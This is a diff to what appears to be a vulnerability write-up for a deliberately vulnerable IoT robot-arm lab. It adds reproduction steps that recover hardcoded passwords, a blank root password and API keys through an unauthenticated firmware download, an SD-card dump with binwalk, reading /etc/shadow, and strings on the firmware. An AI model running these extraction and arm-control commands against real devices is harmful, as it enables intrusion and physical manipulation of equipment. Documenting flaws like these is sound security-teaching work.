@@ -81,7 +81,9 @@ def authenticate(cmd):
 
 The broker is the only component that talks to the Arduino over USB serial, so the password is shared one-to-one between firmware and broker. Because it is a compile-time constant on both sides, it is recoverable from the overlay, the firmware source, or the flashed `.hex` image.
 
-The cloud API makes the image even easier to obtain. The unauthenticated endpoint `GET /api/v1/firmware` returns the compiled firmware to anyone who can reach the cloud container, so an external attacker does not need filesystem access to the Pi or the overlay to extract the password.
+The cloud API makes the image even easier to obtain. The unauthenticated endpoint `GET /api/v0/firmware` returns the compiled firmware to anyone who can reach the cloud container, so an external attacker does not need filesystem access to the Pi or the overlay to extract the password.
+
+A fourth path exists when the attacker can dump the Pi's SD card or extract the base Squashfs rootfs. Binwalk extraction of `/dev/mmcblk0p2` recovers `/etc/shadow` (blank root password), `/etc/config/rpcd` and `/etc/config/uhttpd` (default password `openwrt`), and the live OctoBot overlay reveals `api_key 'octobot-industrial-2020'` and `admin/admin`. Converting `robot_arm.hex` to binary and running `strings` recovers `OctoSuperBot2026` even without the cloud API. See [IoT:I10-FW — Firmware Static Analysis](IoT_Firmware_Static_Analysis.md).
 
 ## Steps to Reproduce
 
@@ -112,14 +114,52 @@ printf 'S0:90\n' | nc 192.168.2.1 2000
 # The arm moves because serial_bus.py prepends PASS:OctoSuperBot2026 before forwarding.
 
 # 7. Download the firmware from the unauthenticated cloud endpoint and extract the password
-curl -s http://localhost:5003/api/v1/firmware -o robot_arm.hex
-strings robot_arm.hex | grep -i octosuperbot
+curl -s http://localhost:5003/api/v0/firmware -o robot_arm.hex
+
+objcopy -I ihex robot_arm.hex -O binary robot_arm.bin
+
+strings robot_arm.bin | grep -i octosuperbot
+# -> OctoSuperBot2026
+
+# 8. Firmware static analysis path (SD-card dump, no network access needed)
+ssh root@192.168.2.1 'dd if=/dev/mmcblk0p2 bs=4M count=32 2>/dev/null' > p2_sample.img
+binwalk -e -M p2_sample.img
+# Inspect the extracted Squashfs rootfs:
+cat _p2_sample.img.extracted/squashfs-root/etc/shadow            # blank root password
+cat _p2_sample.img.extracted/squashfs-root/etc/config/rpcd       # password 'openwrt'
+# Pull the live overlay and inspect the OctoBot config:
+ssh root@192.168.2.1 'tar -czf - /etc/config/octobot' > octobot_config.tar.gz
+tar -xzf octobot_config.tar.gz
+grep -E "api_key|admin_user|admin_pass" etc/config/octobot
+# -> option api_key 'octobot-industrial-2020'
+# -> option admin_user 'admin'
+# -> option admin_pass 'admin'
+# Recover the actuator password from the Arduino firmware image:
+python3 -c '
+import sys
+with open("/opt/octobot/firmware/robot_arm.hex") as f:
+    data = {}
+    for line in f:
+        line = line.strip()
+        if not line or line[0] != ":": continue
+        bc = int(line[1:3], 16)
+        addr = int(line[3:7], 16)
+        rt = int(line[7:9], 16)
+        pl = bytes.fromhex(line[9:9+bc*2])
+        if rt == 0:
+            for i, b in enumerate(pl): data[addr+i] = b
+out = bytearray(max(data)+1)
+for a, b in data.items(): out[a] = b
+open("robot_arm.bin", "wb").write(out)
+'
+strings robot_arm.bin | grep -iE "OctoSuperBot|OCTOBOT_FW_VERSION"
+# -> OCTOBOT_FW_VERSION:v1.0.0
 # -> OctoSuperBot2026
 ```
 
 ## Expected Result
 
-`/login` returns `{"ok": true}` for `admin/admin`, and the API key plus admin password appear in plaintext in both the gateway script and `uci show octobot`. The firmware-serial password `OctoSuperBot2026` appears in plaintext in `serial_bus.py`, in the Arduino source, and can be recovered from the compiled firmware image or by downloading it from `GET /api/v1/firmware`. Direct serial movement commands without the `PASS:` prefix are rejected with `ERR AUTH`, while commands prefixed with `PASS:OctoSuperBot2026 ` are executed. Network paths that terminate at the Pi broker continue to move the arm because the broker adds the password transparently.
+`/login` returns `{"ok": true}` for `admin/admin`, and the API key plus admin password appear in plaintext in both the gateway script and `uci show octobot`. The firmware-serial password `OctoSuperBot2026` appears in plaintext in `serial_bus.py`, in the Arduino source, and can be recovered from the compiled firmware image or by downloading it from `GET /api/v0/firmware`. Direct serial movement commands without the `PASS:` prefix are rejected with `ERR AUTH`, while commands prefixed with `PASS:OctoSuperBot2026 ` are executed. Network paths that terminate at the Pi broker continue to move the arm because the broker adds the password transparently.
 
 ## How It Should Be
 
@@ -148,9 +188,15 @@ For the actuator boundary, do not rely on a static password inside the firmware.
 - [ ] Direct `PASS:OctoSuperBot2026 S0:90` to the Arduino replies `OK S0:90` and moves the arm
 - [ ] `printf 'S0:90\n' | nc 192.168.2.1 2000` moves the arm via the broker-injected password
 - [ ] The compiled `robot_arm.hex` flashes successfully and enforces the password on the real Arduino
-- [ ] `GET /api/v1/firmware` returns the firmware image and `strings` recovers `OctoSuperBot2026`
+- [ ] `GET /api/v0/firmware` returns the firmware image and `strings` recovers `OctoSuperBot2026`
+- [ ] SD-card dump + binwalk extracts the Squashfs rootfs
+- [ ] Extracted `/etc/shadow` shows a blank root password
+- [ ] Extracted `/etc/config/rpcd` or `/etc/config/uhttpd` contains the default password `openwrt`
+- [ ] Extracted OctoBot overlay exposes `api_key`, `admin_user`, and `admin_pass` in cleartext
+- [ ] `strings` on the converted `robot_arm.hex` binary recovers `OctoSuperBot2026`
 
 ## Related Vulnerabilities
 
-- [IoT:I4 — Lack of Secure Update Mechanism](IoT4_Lack_of_Secure_Update_Mechanism.md): the unauthenticated `GET /api/v1/firmware` endpoint is the download vector that exposes the compiled firmware image.
-- [API5:2023 — Broken Function Level Authorization](../API/API5_Broken_Function_Level_Authorization.md): the same v1 endpoint bypasses the session check that gates v2.
+- [IoT:I4 — Lack of Secure Update Mechanism](IoT4_Lack_of_Secure_Update_Mechanism.md): the unauthenticated `GET /api/v0/firmware` endpoint is the download vector that exposes the compiled firmware image.
+- [API5:2023 — Broken Function Level Authorization](../API/API5_Broken_Function_Level_Authorization.md): the same v0 endpoint bypasses the session check that gates v2.
+- [M8 — Security Misconfiguration](../Mobile/M8_Security_Misconfiguration.md): the login panel's pre-authentication use of `/api/v2/firmware/version` reveals the API's versioning scheme, enabling an attacker to fuzz and discover the unauthenticated v0 endpoint.
